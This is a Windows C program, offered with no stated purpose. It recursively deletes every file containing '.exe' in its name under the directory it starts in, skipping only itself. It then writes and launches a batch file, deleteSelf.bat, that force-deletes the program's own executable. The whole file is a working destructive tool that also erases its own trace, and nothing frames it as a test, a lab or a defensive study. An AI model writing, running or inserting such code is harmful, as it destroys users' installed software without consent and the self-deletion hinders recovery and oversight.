#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void deleteExeFiles(const char *path, const char *currentExePath) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char searchPath[1024];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", path);

    hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Unable to open directory: %s\n", path);
        return;
    }

    do {
        // Skip current and parent directories
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }

        char fullPath[1024];
        snprintf(fullPath, sizeof(fullPath), "%s\\%s", path, findFileData.cFileName);

        DWORD dwFileAttr = GetFileAttributes(fullPath);
        if (dwFileAttr == INVALID_FILE_ATTRIBUTES) {
            continue;
        }

        if (dwFileAttr & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursively search subdirectories
            deleteExeFiles(fullPath, currentExePath);
        } else if (dwFileAttr & FILE_ATTRIBUTE_ARCHIVE) {
            // Check if the file has .exe extension and isn't the current executable
            if (strstr(findFileData.cFileName, ".exe") != NULL && strcmp(fullPath, currentExePath) != 0) {
                if (DeleteFile(fullPath)) {
                    printf("Deleted: %s\n", fullPath);
                } else {
                    printf("Failed to delete: %s\n", fullPath);
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void createDeleteBatchFile(const char *currentExePath) {
    FILE *batchFile = fopen("deleteSelf.bat", "w");
    if (batchFile == NULL) {
        printf("Failed to create batch file\n");
        return;
    }

    fprintf(batchFile, "@echo off\n");
    fprintf(batchFile, "del /f /q \"%s\"\n", currentExePath);  // Force delete the current executable
    fprintf(batchFile, "exit\n");

    fclose(batchFile);
    printf("Created batch file to delete itself: deleteSelf.bat\n");

    // Run the batch file asynchronously after the program exits
    system("start deleteSelf.bat");
}

int main() {
    char currentExePath[MAX_PATH];
    DWORD length = GetModuleFileName(NULL, currentExePath, sizeof(currentExePath));

    if (length == 0) {
        perror("Failed to get current executable path");
        return 1;
    }

    const char *path = ".";  // Start from the current directory
    deleteExeFiles(path, currentExePath);

    // Now create and run the batch file that will delete the program itself
    createDeleteBatchFile(currentExePath);

    return 0;
}
